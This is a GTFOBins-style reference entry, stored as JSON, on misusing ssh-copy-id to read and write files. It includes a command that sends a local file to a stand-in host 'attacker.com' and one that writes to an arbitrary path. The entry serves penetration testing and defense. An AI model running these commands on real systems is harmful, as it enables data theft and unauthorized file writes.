{"title": "ssh-copy-id", "source": "gtfobins", "source_label": "GTFOBins", "path": "ssh-copy-id", "html": "<h1>ssh-copy-id</h1>\n<h2>File Read</h2>\n<p>The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.</p>\n<pre><code class=\"language-bash\">ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com</code></pre>\n<h2>File Write</h2>\n<p>The input file must have the `.pub` file extension.</p>\n<pre><code class=\"language-bash\">ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host</code></pre>", "excerpt": "ssh-copy-id File Read The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used. ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com…", "tags": ["func:file-read", "func:file-write", "ctx:sudo", "ctx:unprivileged"]}